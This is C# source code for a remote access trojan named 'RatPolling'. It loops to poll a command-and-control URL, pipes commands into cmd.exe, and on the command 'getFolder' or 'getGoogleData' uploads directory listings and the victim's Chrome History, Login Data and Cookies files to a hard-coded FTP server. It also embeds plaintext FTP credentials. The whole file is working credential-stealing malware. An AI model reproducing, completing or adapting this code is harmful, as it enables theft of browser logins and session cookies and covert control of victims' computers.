using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace RatPolling
{
    class Program
    {
        private static bool ScanDir(string Path, StreamWriter f)
        {
            try
            {
                string[] dirs = Directory.GetDirectories(Path);

                if (dirs.Length == 0)
                {
                    return true;
                }
                else
                {
                    foreach (string dir in dirs)
                    {
                        Console.WriteLine(dir);
                        f.WriteLine(dir);
                        ScanDir(dir, f);
                    }
                }
            }
            catch
            {
                Console.WriteLine("Error!");
            }
            return true;
        }

        static void Main(string[] args)
        {
            String UserName = "TestPC";
            string CurrentUser = Environment.UserName;

            Console.WriteLine("Connection..." + CurrentUser);
            while (true)
            {
                try
                {
                    WebClient client = new WebClient();
                    client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

                    Stream data = client.OpenRead("http://techapi.ru/command.php?UIN=" + UserName);
                    StreamReader reader = new StreamReader(data);
                    string s = reader.ReadToEnd();
                    Console.WriteLine(s);
                    data.Close();
                    reader.Close();



                    string[] argsCommand = { };
                    string[] commands = s.Split('|');
                    string[] atrs = { };

                    foreach (var command in commands)
                    {
                        if (command != "")
                        {
                            argsCommand = command.Split('-');
                            atrs = argsCommand[1].Split('=');
                            Console.WriteLine(argsCommand[0]);


                            const string com = @"mkdir sd";
                            var process = new Process
                            {
                                StartInfo = new ProcessStartInfo
                                {
                                    FileName = "cmd.exe",
                                    RedirectStandardInput = true,
                                    UseShellExecute = false

                                }
                            };
                            process.Start();

                            using (StreamWriter pWriter = process.StandardInput)
                            {
                                if (pWriter.BaseStream.CanWrite)
                                {
                                    StreamWriter f = new StreamWriter(@"C:\Users\79242\source\repos\RatPolling\RatPolling\line.txt");
                                    foreach (var line in com.Split('\n'))
                                    {
                                        
                                        pWriter.WriteLine(line);
                                        f.WriteLine(line);
                                    }
                                    f.Close();
                                }
                            }

                            if (argsCommand[0] == "getFolder")
                            {
                                StreamWriter f = new StreamWriter(@"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
                                ScanDir(atrs[0], f);
                                f.Close();
                                client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
                                client.UploadFile("ftp://31.31.196.203/logDirScan" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, @"C:\Users\79242\source\repos\RatPolling\RatPolling\test.txt");
                            }

                            if (argsCommand[0] == "getGoogleData")
                            {
                                String pathToGoogleCookie = "C:\\Users\\" + CurrentUser + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\";
                                if (System.IO.Directory.Exists(pathToGoogleCookie))
                                {
                                    try
                                    {
                                        using (var clienst = new WebClient())
                                        {
                                            client.Credentials = new NetworkCredential("u0777445", "RL7srYg_");
                                            client.UploadFile("ftp://31.31.196.203/History" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "History");
                                            client.UploadFile("ftp://31.31.196.203/Login.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Login Data");
                                            client.UploadFile("ftp://31.31.196.203/Cookies.txt" + UserName + ".txt", WebRequestMethods.Ftp.UploadFile, pathToGoogleCookie + "Cookies");
                                        }
                                    }
                                    catch (System.Net.WebException e)
                                    {
                                        Console.WriteLine("[-] ERROR: FTP Connection error.");
                                    }
                                }
                                Console.WriteLine("[+] Data of ftp server." + pathToGoogleCookie);
                            }

                        }

                    }
                    Console.WriteLine("[-] WARNING: The response returned null.");
                }
                catch (System.Net.WebException e)
                {
                    Console.WriteLine("[-] ERROR: Connection error.");
                }

                Thread.Sleep(2000);


            }









        }



    }
}
